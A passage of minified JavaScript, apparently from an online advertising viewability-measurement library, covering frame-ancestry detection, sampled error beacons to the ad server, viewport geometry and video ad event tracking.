            je(b, 3, C(a, 3));
            je(b, 7, C(a, 7));
            var d = C(a, 8);
            if (null != d) {
                md(b.g, 69);
                c = b.g;
                var e = d;
                e = (d = 0 > e ? 1 : 0) ? -e : e;
                if (0 === e) 0 < 1 / e ? hd = id = 0 : (id = 0, hd = 2147483648);
                else if (isNaN(e)) id = 0, hd = 2147483647;
                else if (3.4028234663852886E38 < e) id = 0, hd = (d << 31 | 2139095040) >>> 0;
                else if (1.1754943508222875E-38 > e) e = Math.round(e / Math.pow(2, -149)), id = 0, hd = (d << 31 | e) >>> 0;
                else {
                    var f = Math.floor(Math.log(e) / Math.LN2);
                    e *=
                        Math.pow(2, -f);
                    e = Math.round(8388608 * e) & 8388607;
                    id = 0;
                    hd = (d << 31 | f + 127 << 23 | e) >>> 0
                }
                nd(c, hd)
            }
            ie(b, 4, C(a, 4));
            ie(b, 5, C(a, 5));
            ie(b, 6, C(a, 6));
            Pe(a, b)
        },
        vk = [1, 2];
    var Dk = function(a) {
        B.call(this, a)
    };
    t(Dk, B);
    var Ek;
    Ek = ["av.default", "js", "unreleased"].slice(-1)[0];
    var Fk = RegExp("^https?://(\\w|-)+\\.cdn\\.ampproject\\.(net|org)(\\?|/|$)"),
        Jk = function(a) {
            a = a || Gk();
            for (var b = new Hk(u.location.href, u, !1), c = null, d = a.length - 1, e = d; 0 <= e; --e) {
                var f = a[e];
                !c && Fk.test(f.url) && (c = f);
                if (f.url && !f.Hc) {
                    b = f;
                    break
                }
            }
            e = null;
            f = a.length && a[d].url;
            0 != b.depth && f && (e = a[d]);
            return new Ik(b, e, c)
        },
        Gk = function() {
            var a = u,
                b = [],
                c = null;
            do {
                var d = a;
                if (Kf(d)) {
                    var e = d.location.href;
                    c = d.document && d.document.referrer || null
                } else e = c, c = null;
                b.push(new Hk(e || "", d));
                try {
                    a = d.parent
                } catch (f) {
                    a = null
                }
            } while (a &&
                d != a);
            d = 0;
            for (a = b.length - 1; d <= a; ++d) b[d].depth = a - d;
            d = u;
            if (d.location && d.location.ancestorOrigins && d.location.ancestorOrigins.length == b.length - 1)
                for (a = 1; a < b.length; ++a) e = b[a], e.url || (e.url = d.location.ancestorOrigins[a - 1] || "", e.Hc = !0);
            return b
        },
        Ik = function(a, b, c) {
            this.g = a;
            this.h = b;
            this.l = c
        },
        Hk = function(a, b, c) {
            this.url = a;
            this.ka = b;
            this.Hc = !!c;
            this.depth = null
        };
    var Kk = function() {
            this.l = "&";
            this.h = {};
            this.o = 0;
            this.g = []
        },
        Lk = function(a, b) {
            var c = {};
            c[a] = b;
            return [c]
        },
        Nk = function(a, b, c, d, e) {
            var f = [];
            Of(a, function(g, h) {
                (g = Mk(g, b, c, d, e)) && f.push(h + "=" + g)
            });
            return f.join(b)
        },
        Mk = function(a, b, c, d, e) {
            if (null == a) return "";
            b = b || "&";
            c = c || ",$";
            "string" == typeof c && (c = c.split(""));
            if (a instanceof Array) {
                if (d = d || 0, d < c.length) {
                    for (var f = [], g = 0; g < a.length; g++) f.push(Mk(a[g], b, c, d + 1, e));
                    return f.join(c[d])
                }
            } else if ("object" == typeof a) return e = e || 0, 2 > e ? encodeURIComponent(Nk(a,
                b, c, d, e + 1)) : "...";
            return encodeURIComponent(String(a))
        },
        Ok = function(a, b, c) {
            a.g.push(b);
            a.h[b] = c
        },
        Pk = function(a, b, c, d) {
            a.g.push(b);
            a.h[b] = Lk(c, d)
        },
        Rk = function(a, b, c) {
            b = b + "//pagead2.googlesyndication.com" + c;
            var d = Qk(a) - c.length;
            if (0 > d) return "";
            a.g.sort(function(m, v) {
                return m - v
            });
            c = null;
            for (var e = "", f = 0; f < a.g.length; f++)
                for (var g = a.g[f], h = a.h[g], k = 0; k < h.length; k++) {
                    if (!d) {
                        c = null == c ? g : c;
                        break
                    }
                    var n = Nk(h[k], a.l, ",$");
                    if (n) {
                        n = e + n;
                        if (d >= n.length) {
                            d -= n.length;
                            b += n;
                            e = a.l;
                            break
                        }
                        c = null == c ? g : c
                    }
                }
            a = "";
            null != c &&
                (a = e + "trn=" + c);
            return b + a + ""
        },
        Qk = function(a) {
            var b = 1,
                c;
            for (c in a.h) b = c.length > b ? c.length : b;
            return 3997 - b - a.l.length - 1
        };
    var Sk = function(a, b, c, d, e) {
        if ((d ? a.g : Math.random()) < (e || .01)) try {
            if (c instanceof Kk) var f = c;
            else f = new Kk, Of(c, function(h, k) {
                var n = f,
                    m = n.o++;
                Ok(n, m, Lk(k, h))
            });
            var g = Rk(f, a.h, "/pagead/gen_204?id=" + b + "&");
            g && bg(u, g)
        } catch (h) {}
    };
    var Vk = function() {
        var a = Tk;
        this.A = Uk;
        this.B = "jserror";
        this.l = !0;
        this.h = null;
        this.C = this.Ha;
        this.g = void 0 === a ? null : a;
        this.o = !1
    };
    l = Vk.prototype;
    l.kc = function(a) {
        this.h = a
    };
    l.Sc = function(a) {
        this.B = a
    };
    l.Tc = function(a) {
        this.l = a
    };
    l.Uc = function(a) {
        this.o = a
    };
    l.fb = function(a, b, c) {
        try {
            if (this.g && this.g.l) {
                var d = this.g.start(a.toString(), 3);
                var e = b();
                this.g.end(d)
            } else e = b()
        } catch (k) {
            b = this.l;
            try {
                fh(d);
                var f = new Ug(k, {
                    message: Wk(k)
                });
                b = this.C(a, f, void 0, c)
            } catch (n) {
                this.Ha(217, n)
            }
            if (b) {
                var g, h;
                null == (g = window.console) || null == (h = g.error) || h.call(g, k)
            } else throw k;
        }
        return e
    };
    l.Pc = function(a, b, c, d) {
        var e = this;
        return function(f) {
            for (var g = [], h = 0; h < arguments.length; ++h) g[h - 0] = arguments[h];
            return e.fb(a, function() {
                return b.apply(c, g)
            }, d)
        }
    };
    l.Ha = function(a, b, c, d, e) {
        e = e || this.B;
        try {
            var f = new Kk;
            Pk(f, 1, "context", a);
            Vg(b) || (b = new Ug(b, {
                message: Wk(b)
            }));
            b.msg && Pk(f, 2, "msg", b.msg.substring(0, 512));
            var g = b.meta || {};
            if (this.h) try {
                this.h(g)
            } catch (k) {}
            if (d) try {
                d(g)
            } catch (k) {}
            Ok(f, 3, [g]);
            var h = Jk();
            h.h && Pk(f, 4, "top", h.h.url || "");
            Ok(f, 5, [{
                url: h.g.url || ""
            }, {
                url: h.g.url ? Gf(h.g.url) : ""
            }]);
            Sk(this.A, e, f, this.o, c)
        } catch (k) {
            try {
                Sk(this.A, e, {
                    context: "ecmserr",
                    rctx: a,
                    msg: Wk(k),
                    url: h && h.g.url
                }, this.o, c)
            } catch (n) {}
        }
        return this.l
    };
    var Wk = function(a) {
        var b = a.toString();
        a.name && -1 == b.indexOf(a.name) && (b += ": " + a.name);
        a.message && -1 == b.indexOf(a.message) && (b += ": " + a.message);
        if (a.stack) {
            a = a.stack;
            var c = b;
            try {
                -1 == a.indexOf(c) && (a = c + "\n" + a);
                for (var d; a != d;) d = a, a = a.replace(/((https?:\/..*\/)[^\/:]*:\d+(?:.|\n)*)\2/, "$1");
                b = a.replace(/\n */g, "\n")
            } catch (e) {
                b = c
            }
        }
        return b
    };
    var Uk, Xk, Yk = tg(),
        Tk = new eh(1, Yk);
    Uk = new function() {
        var a = void 0 === a ? D : a;
        this.h = "http:" === a.location.protocol ? "http:" : "https:";
        this.g = Math.random()
    };
    "number" !== typeof Yk.google_srt && (Yk.google_srt = Math.random());
    var Zk = Uk,
        $k = Yk.google_srt;
    0 <= $k && 1 >= $k && (Zk.g = $k);
    Xk = new Vk;
    Xk.kc(function() {});
    Xk.Uc(!0);
    "complete" == Yk.document.readyState ? Yk.google_measure_js_timing || Tk.C() : Tk.l && ff(Yk, "load", function() {
        Yk.google_measure_js_timing || Tk.C()
    });
    var al = function() {
        this.blockSize = -1
    };
    var bl = [0, 2, 1],
        cl = null;
    document.addEventListener && document.addEventListener("mousedown", function(a) {
        cl = a
    }, !0);
    window.mb = function(a) {
        if (a) {
            var b;
            if (b = window.event || cl) {
                var c;
                (c = b.which ? 1 << bl[b.which - 1] : b.button) && b.shiftKey && (c |= 8);
                c && b.altKey && (c |= 16);
                c && b.ctrlKey && (c |= 32);
                b = c
            } else b = null;
            if (c = b)
                if (window.css) window.css(a.id, "mb", c, void 0, void 0);
                else if (a) {
                b = a.href;
                var d = b.indexOf("&mb=");
                if (0 > d) c = b + "&mb=" + c;
                else {
                    d += 4;
                    var e = b.indexOf("&", d);
                    c = 0 <= e ? b.substring(0, d) + c + b.substring(e) : b.substring(0, d) + c
                }
                a.href = 2E3 < c.length ? b : c
            }
        }
    };
    var dl = function(a) {
        var b = {};
        z(a, function(c) {
            var d = c.g,
                e = b[d];
            b.hasOwnProperty(d) ? null !== e && (c.h(e) || (b[d] = null)) : b[d] = c
        });
        zb(a, function(c) {
            return null === b[c.g]
        })
    };
    var el = {
            NONE: 0,
            Pf: 1
        },
        fl = {
            Of: 0,
            Sg: 1,
            Rg: 2,
            Tg: 3
        };
    var gl = function() {
        this.Z = 0;
        this.g = !1;
        this.h = -1;
        this.Za = !1;
        this.oa = 0
    };
    gl.prototype.isVisible = function() {
        return this.Za ? .3 <= this.Z : .5 <= this.Z
    };
    var hl = {
            Nf: 0,
            Tf: 1
        },
        il = {
            668123728: 0,
            668123729: 1
        },
        jl = {
            44731964: 0,
            44731965: 1
        },
        kl = {
            NONE: 0,
            tg: 1,
            Xf: 2
        },
        ll = {
            480596784: 0,
            480596785: 1,
            21063355: 2
        };
    var ml = function() {
            this.g = null;
            this.o = !1;
            this.l = null
        },
        nl = function(a) {
            a.o = !0;
            return a
        },
        ol = function(a, b) {
            a.l && z(b, function(c) {
                c = a.l[c];
                void 0 !== c && a.h(c)
            })
        },
        pl = function(a) {
            ml.call(this);
            this.B = a
        };
    t(pl, ml);
    pl.prototype.h = function(a) {
        null === this.g && Qb(this.B, a) && (this.g = a)
    };
    var ql = function() {
        ml.call(this)
    };
    t(ql, ml);
    ql.prototype.h = function(a) {
        null === this.g && "number" === typeof a && (this.g = a)
    };
    var rl = function() {
        ml.call(this)
    };
    t(rl, ml);
    rl.prototype.h = function(a) {
        null === this.g && "string" === typeof a && (this.g = a)
    };
    var sl = function() {
        this.g = {};
        this.l = !0;
        this.h = {}
    };
    sl.prototype.enable = function() {
        this.l = !0
    };
    sl.prototype.reset = function() {
        this.g = {};
        this.l = !0;
        this.h = {}
    };
    var tl = function(a, b, c) {
            a.g[b] || (a.g[b] = new pl(c));
            return a.g[b]
        },
        ul = function(a) {
            a.g.queryid || (a.g.queryid = new rl)
        },
        vl = function(a, b, c) {
            (a = a.g[b]) && a.h(c)
        },
        wl = function(a, b) {
            if (Pb(a.h, b)) return a.h[b];
            if (a = a.g[b]) return a.g
        },
        xl = function(a) {
            var b = {},
                c = Hb(a.g, function(d) {
                    return d.o
                });
            Gb(c, function(d, e) {
                d = void 0 !== a.h[e] ? String(a.h[e]) : d.o && null !== d.g ? String(d.g) : "";
                0 < d.length && (b[e] = d)
            }, a);
            return b
        },
        yl = function(a) {
            a = xl(a);
            var b = [];
            Gb(a, function(c, d) {
                d in Object.prototype || "undefined" != typeof c && b.push([d,
                    ":", c
                ].join(""))
            });
            return b
        },
        zl = function() {
            var a = N().U,
                b = Zh();
            a.l && z(Mb(a.g), function(c) {
                return ol(c, b)
            })
        };
    var Al = !vd && !Lc();
    var Bl = function() {
        this.g = this.Sa = null
    };
    var Cl = function() {};
    Cl.prototype.now = function() {
        return 0
    };
    Cl.prototype.h = function() {
        return 0
    };
    Cl.prototype.l = function() {
        return 0
    };
    Cl.prototype.g = function() {
        return 0
    };
    var El = function() {
        if (!Dl()) throw Error();
    };
    t(El, Cl);
    var Dl = function() {
        return !(!D || !D.performance)
    };
    El.prototype.now = function() {
        return Dl() && D.performance.now ? D.performance.now() : Cl.prototype.now.call(this)
    };
    El.prototype.h = function() {
        return Dl() && D.performance.memory ? D.performance.memory.totalJSHeapSize || 0 : Cl.prototype.h.call(this)
    };
    El.prototype.l = function() {
        return Dl() && D.performance.memory ? D.performance.memory.usedJSHeapSize || 0 : Cl.prototype.l.call(this)
    };
    El.prototype.g = function() {
        return Dl() && D.performance.memory ? D.performance.memory.jsHeapSizeLimit || 0 : Cl.prototype.g.call(this)
    };
    var Fl = function() {};
    Fl.prototype.isVisible = function() {
        return 1 === ih(Qe)
    };
    var Gl = function(a, b) {
            this.g = a;
            this.depth = b
        },
        Il = function(a) {
            a = a || Gk();
            var b = Math.max(a.length - 1, 0),
                c = Jk(a);
            a = c.g;
            var d = c.h,
                e = c.l,
                f = [];
            c = function(h, k) {
                return null == h ? k : h
            };
            e && f.push(new Gl([e.url, e.Hc ? 2 : 0], c(e.depth, 1)));
            d && d != e && f.push(new Gl([d.url, 2], 0));
            a.url && a != e && f.push(new Gl([a.url, 0], c(a.depth, b)));
            var g = qb(f, function(h, k) {
                return f.slice(0, f.length - k)
            });
            !a.url || (e || d) && a != e || (d = Qf(a.url)) && g.push([new Gl([d, 1], c(a.depth, b))]);
            g.push([]);
            return qb(g, function(h) {
                return Hl(b, h)
            })
        };

    function Hl(a, b) {
        var c = rb(b, function(e, f) {
                return Math.max(e, f.depth)
            }, -1),
            d = Fb(c + 2);
        d[0] = a;
        z(b, function(e) {
            return d[e.depth + 1] = e.g
        });
        return d
    }
    var Jl = function() {
        var a = Il();
        return qb(a, function(b) {
            return Mk(b)
        })
    };
    var Kl = function() {
            this.h = new Fl;
            this.g = Dl() ? new El : new Cl
        },
        Ml = function() {
            Ll();
            var a = D.document;
            return !!(a && a.body && a.body.getBoundingClientRect && "function" === typeof D.setInterval && "function" === typeof D.clearInterval && "function" === typeof D.setTimeout && "function" === typeof D.clearTimeout)
        };
    Kl.prototype.setTimeout = function(a, b) {
        return D.setTimeout(a, b)
    };
    Kl.prototype.clearTimeout = function(a) {
        D.clearTimeout(a)
    };
    var Nl = function(a) {
            Ll();
            var b = tg() || D;
            bg(b, a)
        },
        Ol = function() {
            Ll();
            return Jl()
        };
    var Pl = function() {};
    Pl.prototype.getContext = function() {
        if (!this.g) {
            if (!D) throw Error("Context has not been set and window is undefined.");
            this.g = G(Kl)
        }
        return this.g
    };
    var Ll = function() {
        return G(Pl).getContext()
    };
    var Ql = function(a) {
        B.call(this, a)
    };
    t(Ql, B);
    var Rl = function(a) {
            this.l = a;
            this.g = -1;
            this.h = this.o = 0
        },
        Sl = function(a, b) {
            return function(c) {
                for (var d = [], e = 0; e < arguments.length; ++e) d[e - 0] = arguments[e];
                if (-1 < a.g) return b.apply(null, ha(d));
                try {
                    return a.g = a.l.g.now(), b.apply(null, ha(d))
                } finally {
                    a.o += a.l.g.now() - a.g, a.g = -1, a.h += 1
                }
            }
        };
    var Tl = function(a, b) {
        this.h = a;
        this.l = b;
        this.g = new Rl(a)
    };
    var Ul = function() {};
    var Vl = {
        Ng: 1,
        ph: 2,
        Bg: 3
    };
    hc(cc(dc("https://pagead2.googlesyndication.com/pagead/osd.js")));
    var Wl = function() {
        this.o = void 0;
        this.h = this.C = 0;
        this.A = -1;
        this.U = new sl;
        nl(tl(this.U, "mv", kl)).l = void 0 === ll ? null : ll;
        tl(this.U, "omid", hl);
        nl(tl(this.U, "epoh", hl));
        nl(tl(this.U, "epph", hl));
        nl(tl(this.U, "umt", hl)).l = void 0 === il ? null : il;
        nl(tl(this.U, "phel", hl));
        nl(tl(this.U, "phell", hl));
        nl(tl(this.U, "oseid", Vl));
        var a = this.U;
        a.g.sloi || (a.g.sloi = new ql);
        nl(a.g.sloi);
        nl(tl(this.U, "ovms", fl));
        nl(tl(this.U, "xdi", hl));
        nl(tl(this.U, "amp", hl));
        nl(tl(this.U, "prf", hl));
        nl(tl(this.U, "gtx", hl));
        nl(tl(this.U, "mvp_lv",
            hl));
        nl(tl(this.U, "ssmol", hl)).l = void 0 === jl ? null : jl;
        this.g = new Tl(Ll(), this.U);
        this.B = this.l = !1;
        this.flags = new Ul
    };
    Wl.prototype.Oc = function(a) {
        if ("string" === typeof a && 0 != a.length) {
            var b = this.U;
            if (b.l) {
                a = a.split("&");
                for (var c = a.length - 1; 0 <= c; c--) {
                    var d = a[c].split("="),
                        e = d[0];
                    d = 1 < d.length ? parseInt(d[1], 10) : 1;
                    isNaN(d) || (e = b.g[e]) && e.h(d)
                }
            }
        }
    };
    var N = function() {
        return G(Wl)
    };
    var Xl = function() {
            var a = "https:";
            D && D.location && "http:" === D.location.protocol && (a = "http:");
            this.h = a;
            this.g = .01;
            this.l = Math.random()
        },
        Yl = function(a, b, c, d, e) {
            if ((d ? a.l : Math.random()) < (e || a.g)) try {
                if (c instanceof Kk) var f = c;
                else f = new Kk, Of(c, function(h, k) {
                    var n = f,
                        m = n.o++;
                    Ok(n, m, Lk(k, h))
                });
                var g = Rk(f, a.h, "/pagead/gen_204?id=" + b + "&");
                g && Nl(g)
            } catch (h) {}
        };
    var am = function() {
        var a = Zl;
        this.A = $l;
        this.B = "jserror";
        this.l = !0;
        this.h = null;
        this.C = this.Ha;
        this.g = void 0 === a ? null : a;
        this.o = !1
    };
    l = am.prototype;
    l.kc = function(a) {
        this.h = a
    };
    l.Sc = function(a) {
        this.B = a
    };
    l.Tc = function(a) {
        this.l = a
    };
    l.Uc = function(a) {
        this.o = a
    };
    l.fb = function(a, b, c) {
        var d = this;
        return Sl(N().g.g, function() {
            try {
                if (d.g && d.g.l) {
                    var e = d.g.start(a.toString(), 3);
                    var f = b();
                    d.g.end(e)
                } else f = b()
            } catch (k) {
                var g = d.l;
                try {
                    fh(e);
                    var h = new bm(cm(k));
                    g = d.C(a, h, void 0, c)
                } catch (n) {
                    d.Ha(217, n)
                }
                if (!g) throw k;
            }
            return f
        })()
    };
    l.Pc = function(a, b, c, d) {
        var e = this;
        return Sl(N().g.g, function(f) {
            for (var g = [], h = 0; h < arguments.length; ++h) g[h - 0] = arguments[h];
            return e.fb(a, function() {
                return b.apply(c, g)
            }, d)
        })
    };
    l.Ha = function(a, b, c, d, e) {
        e = e || this.B;
        try {
            var f = new Kk;
            Pk(f, 1, "context", a);
            Vg(b) || (b = new bm(cm(b)));
            b.msg && Pk(f, 2, "msg", b.msg.substring(0, 512));
            var g = b.meta || {};
            if (this.h) try {
                this.h(g)
            } catch (k) {}
            if (d) try {
                d(g)
            } catch (k) {}
            Ok(f, 3, [g]);
            var h = Jk();
            h.h && Pk(f, 4, "top", h.h.url || "");
            Ok(f, 5, [{
                url: h.g.url || ""
            }, {
                url: h.g.url ? Gf(h.g.url) : ""
            }]);
            Yl(this.A, e, f, this.o, c)
        } catch (k) {
            try {
                Yl(this.A, e, {
                    context: "ecmserr",
                    rctx: a,
                    msg: cm(k),
                    url: h && h.g.url
                }, this.o, c)
            } catch (n) {}
        }
        return this.l
    };
    var cm = function(a) {
            var b = a.toString();
            a.name && -1 == b.indexOf(a.name) && (b += ": " + a.name);
            a.message && -1 == b.indexOf(a.message) && (b += ": " + a.message);
            if (a.stack) {
                a = a.stack;
                var c = b;
                try {
                    -1 == a.indexOf(c) && (a = c + "\n" + a);
                    for (var d; a != d;) d = a, a = a.replace(/((https?:\/..*\/)[^\/:]*:\d+(?:.|\n)*)\2/, "$1");
                    b = a.replace(/\n */g, "\n")
                } catch (e) {
                    b = c
                }
            }
            return b
        },
        bm = function(a) {
            Ug.call(this, Error(a), {
                message: a
            })
        };
    t(bm, Ug);
    var $l, dm, Zl = new eh(1, tg()),
        em = function() {
            var a = tg();
            a && "undefined" != typeof a.google_measure_js_timing && (a.google_measure_js_timing || Zl.C())
        };
    (function() {
        $l = new Xl;
        dm = new am;
        var a = tg();
        a && a.document && ("complete" == a.document.readyState ? em() : Zl.l && ff(a, "load", function() {
            em()
        }))
    })();
    var fm = function(a) {
            dm.kc(function(b) {
                z(a, function(c) {
                    c(b)
                })
            })
        },
        gm = function(a, b) {
            return dm.fb(a, b, void 0)
        },
        hm = function(a, b, c, d) {
            return dm.Pc(a, b, c, d)
        },
        im = function(a, b, c, d) {
            dm.Ha(a, b, c, d)
        };
    var jm = Date.now(),
        km = -1,
        lm = -1,
        mm, nm = -1,
        om = !1,
        pm = function() {
            return Date.now() - jm
        },
        qm = function() {
            var a = N().o,
                b = 0 <= lm ? pm() - lm : -1,
                c = om ? pm() - km : -1,
                d = 0 <= nm ? pm() - nm : -1;
            if (947190542 == a) return 100;
            if (79463069 == a) return 200;
            a = [2E3, 4E3];
            var e = [250, 500, 1E3];
            im(637, Error(), .001);
            var f = b; - 1 != c && c < b && (f = c);
            for (b = 0; b < a.length; ++b)
                if (f < a[b]) {
                    var g = e[b];
                    break
                }
            void 0 === g && (g = e[a.length]);
            return -1 != d && 1500 < d && 4E3 > d ? 500 : g
        };
    var rm = function(a, b, c) {
        var d = new F(0, 0, 0, 0);
        this.time = a;
        this.volume = null;
        this.l = b;
        this.g = d;
        this.h = c
    };
    var sm = function(a, b, c, d, e, f, g) {
        this.l = a;
        this.h = b;
        this.B = c;
        this.g = d;
        this.o = e;
        this.C = f;
        this.A = g
    };
    sm.prototype.getTimestamp = function() {
        return this.C
    };
    var tm = {
            currentTime: 1,
            duration: 2,
            isVpaid: 4,
            volume: 8,
            isYouTube: 16,
            isPlaying: 32
        },
        Sb = {
            tc: "start",
            FIRST_QUARTILE: "firstquartile",
            MIDPOINT: "midpoint",
            THIRD_QUARTILE: "thirdquartile",
            COMPLETE: "complete",
            ae: "metric",
            sc: "pause",
            kd: "resume",
            SKIPPED: "skip",
            VIEWABLE_IMPRESSION: "viewable_impression",
            be: "mute",
            me: "unmute",
            FULLSCREEN: "fullscreen",
            Wd: "exitfullscreen",
            bd: "bufferstart",
            $c: "bufferfinish",
            dd: "fully_viewable_audible_half_duration_impression",
            jd: "measurable_impression",
            Rd: "abandon",
            cd: "engagedview",
            IMPRESSION: "impression",
            Td: "creativeview",
            LOADED: "loaded",
            Pg: "progress",
            Ff: "close",
            Gf: "collapse",
            ce: "overlay_resize",
            de: "overlay_unmeasurable_impression",
            ee: "overlay_unviewable_impression",
            ge: "overlay_viewable_immediate_impression",
            fe: "overlay_viewable_end_of_session_impression",
            Ud: "custom_metric_viewable",
            Gg: "verification_debug"
        },
        um = "start firstquartile midpoint thirdquartile resume loaded".split(" "),
        vm = ["start", "firstquartile", "midpoint", "thirdquartile"],
        wm = ["abandon"],
        xm = {
            ih: -1,
            tc: 0,
            FIRST_QUARTILE: 1,
            MIDPOINT: 2,
            THIRD_QUARTILE: 3,
            COMPLETE: 4,
            ae: 5,
            sc: 6,
            kd: 7,
            SKIPPED: 8,
            VIEWABLE_IMPRESSION: 9,
            be: 10,
            me: 11,
            FULLSCREEN: 12,
            Wd: 13,
            dd: 14,
            jd: 15,
            Rd: 16,
            cd: 17,
            IMPRESSION: 18,
            Td: 19,
            LOADED: 20,
            Ud: 21,
            bd: 22,
            $c: 23
        };
    var Lb = {
            xf: "addEventListener",
            Yf: "getMaxSize",
            Zf: "getScreenSize",
            $f: "getState",
            ag: "getVersion",
            Qg: "removeEventListener",
            ug: "isViewable"
        },
        ym = function(a) {
            var b = a !== a.top,
                c = a.top === Mg(a).ka,
                d = -1,
                e = 0;
            if (b && c && a.top.mraid) {
                d = 3;
                var f = a.top.mraid
            } else d = (f = a.mraid) ? b ? c ? 2 : 1 : 0 : -1;
            f && (f.IS_GMA_SDK || (e = 2), Kb(function(g) {
                return "function" === typeof f[g]
            }) || (e = 1));
            return {
                ya: f,
                Tb: e,
                mf: d
            }
        };
    var zm = function(a) {
        return (a = a.document) && "function" === typeof a.elementFromPoint
    };
    if (Qe && Qe.URL) {
        var Am, Sf = Qe.URL;
        Am = !!Sf && 0 < Tf().length;
        dm.Tc(!Am)
    }
    var Bm = function(a, b, c, d) {
        var e = void 0 === e ? !1 : e;
        c = hm(d, c);
        ff(a, b, c, {
            capture: e
        })
    };
    var Cm = function(a, b, c) {
        try {
            a && (b = b.top);
            var d = void 0;
            var e = b;
            c = void 0 === c ? !1 : c;
            a && null !== e && e != e.top && (e = e.top);
            try {
                d = (void 0 === c ? 0 : c) ? (new lf(e.innerWidth, e.innerHeight)).round() : tf(e || window).round()
            } catch (k) {
                d = new lf(-12245933, -12245933)
            }
            a = d;
            var f = uf( of (b.document).g);
            if (-12245933 == a.width) {
                var g = a.width;
                var h = new F(g, g, g, g)
            } else h = new F(f.y, f.x + a.width, f.y + a.height, f.x);
            return h
        } catch (k) {
            return new F(-12245933, -12245933, -12245933, -12245933)
        }
    };
    var Dm = function(a, b) {
        b = Math.pow(10, b);
        return Math.floor(a * b) / b
    };

    function Em(a, b, c, d) {
        if (!a) return {
            value: d,
            done: !1
        };
        d = b(d, a);
        var e = c(d, a);
        return !e && rd(a, "parentElement") ? Em(zf(a), b, c, d) : {
            done: e,
            value: d
        }
    }
    var Fm = function(a, b, c, d) {
        if (!a) return d;
        d = Em(a, b, c, d);
        if (!d.done) try {
            var e = nf(a),
                f = e && E(e);
            return Fm(f && f.frameElement, b, c, d.value)
        } catch (g) {}
        return d.value
    };

    function Gm(a) {
        var b = !vd || Md(8);
        return Fm(a, function(c, d) {
            c = rd(d, "style") && d.style && kg(d, "visibility");
            return {
                hidden: "hidden" === c,
                visible: b && "visible" === c
            }
        }, function(c) {
            return c.hidden || c.visible
        }, {
            hidden: !1,
            visible: !1
        }).hidden
    }
    var Hm = function(a) {
            return Fm(a, function(b, c) {
                return !(!rd(c, "style") || !c.style || "none" !== kg(c, "display"))
            }, function(b) {
                return b
            }, !1) ? !0 : Gm(a)
        },
        Im = function(a) {
            return new F(a.top, a.right, a.bottom, a.left)
        },
        Jm = function(a) {
            var b = a.top || 0,
                c = a.left || 0;
            return new F(b, c + (a.width || 0), b + (a.height || 0), c)
        },
        Km = function(a) {
            return null != a && 0 <= a && 1 >= a
        };

    function Lm() {
        var a = Fc;
        return a ? sb("Android TV;AppleTV;Apple TV;GoogleTV;HbbTV;NetCast.TV;Opera TV;POV_TV;SMART-TV;SmartTV;TV Store;AmazonWebAppPlatform;MiBOX".split(";"), function(b) {
            return sc(a, b)
        }) || sc(a, "OMI/") && !sc(a, "XiaoMi/") ? !0 : sc(a, "Presto") && sc(a, "Linux") && !sc(a, "X11") && !sc(a, "Android") && !sc(a, "Mobi") : !1
    }

    function Mm() {
        var a = Fc;
        return sc(a, "AppleTV") || sc(a, "Apple TV") || sc(a, "CFNetwork") || sc(a, "tvOS")
    }

    function Nm() {
        var a;
        (a = sc(Fc, "CrKey") || sc(Fc, "PlayStation") || sc(Fc, "Roku") || Lm() || sc(Fc, "Xbox") || Mm()) || (a = Fc, a = sc(a, "sdk_google_atv_x86") || sc(a, "Android TV"));
        return a
    };
    var Pm = function() {
            this.L = !1;
            this.l = !Kf(D.top);
            this.C = Df() || Ef();
            var a = Gk();
            a = 0 < a.length && null != a[a.length - 1] && null != a[a.length - 1].url ? ((a = a[a.length - 1].url.match(Ff)[3] || null) ? decodeURI(a) : a) || "" : "";
            this.domain = a;
            this.g = new F(0, 0, 0, 0);
            this.B = new lf(0, 0);
            this.o = new lf(0, 0);
            this.I = new F(0, 0, 0, 0);
            this.A = 0;
            this.D = !1;
            this.h = !(!D || !ym(D).ya);
            Om(this)
        },
        Qm = function(a, b) {
            b && b.screen && (a.B = new lf(b.screen.width, b.screen.height))
        },
        Rm = function(a, b) {
            var c = a.g ? new lf(a.g.getWidth(), a.g.getHeight()) : new lf(0, 0);
            b = void 0 === b ? D : b;
            null !== b && b != b.top && (b = b.top);
            var d = 0,
                e = 0;
            try {
                var f = b.document,
                    g = f.body,
                    h = f.documentElement;
                if ("CSS1Compat" == f.compatMode && h.scrollHeight) d = h.scrollHeight != c.height ? h.scrollHeight : h.offsetHeight, e = h.scrollWidth != c.width ? h.scrollWidth : h.offsetWidth;
                else {
                    var k = h.scrollHeight,
                        n = h.scrollWidth,
                        m = h.offsetHeight,
                        v = h.offsetWidth;
                    h.clientHeight != m && (k = g.scrollHeight, n = g.scrollWidth, m = g.offsetHeight, v = g.offsetWidth);
                    k > c.height ? k > m ? (d = k, e = n) : (d = m, e = v) : k < m ? (d = k, e = n) : (d = m, e = v)
                }
                var r = new lf(e,
                    d)
            } catch (w) {
                r = new lf(-12245933, -12245933)
            }
            a.o = r
        },
        Om = function(a) {
            D && D.document && (a.I = Cm(!1, D, a.C), a.g = Cm(!0, D, a.C), Rm(a, D), Qm(a, D))
        },
        Sm = function() {
            var a = O();
            if (0 < a.A || a.D) return !0;
            a = Ll().h.isVisible();
            var b = 0 === ih(Qe);
            return a || b
        },
        O = function() {
            return G(Pm)
        };
    var Tm = function(a) {
        this.l = a;
        this.h = 0;
        this.g = null
    };
    Tm.prototype.cancel = function() {
        Ll().clearTimeout(this.g);
        this.g = null
    };
    var Um = function(a) {
        var b = Ll();
        a.g = b.setTimeout(Sl(N().g.g, hm(143, function() {
            a.h++;
            a.l.sample()
        })), qm())
    };
    var Vm = function(a, b, c) {
        this.ka = a;
        this.da = void 0 === c ? "na" : c;
        this.B = [];
        this.G = !1;
        this.l = new rm(-1, !0, this);
        this.g = this;
        this.I = b;
        this.H = this.L = !1;
        this.V = "uk";
        this.M = !1;
        this.o = !0
    };
    Vm.prototype.D = function() {
        return !1
    };
    Vm.prototype.initialize = function() {
        return this.G = !0
    };
    Vm.prototype.qb = function() {
        return this.g.V
    };
    Vm.prototype.Db = function() {
        return this.g.H
    };
    var Xm = function(a, b, c) {
        if (!a.H || (void 0 === c ? 0 : c)) a.H = !0, a.V = b, a.I = 0, a.g != a || Wm(a)
    };
    Vm.prototype.getName = function() {
        return this.g.da
    };
    Vm.prototype.Ma = function() {
        return this.g.X()
    };
    Vm.prototype.X = function() {
        return {}
    };
    Vm.prototype.Ga = function() {
        return this.g.I
    };
    var Ym = function(a, b) {
        wb(a.B, b) || (a.B.push(b), b.rb(a.g), b.Pa(a.l), b.Ca() && (a.L = !0))
    };
    Vm.prototype.R = function() {
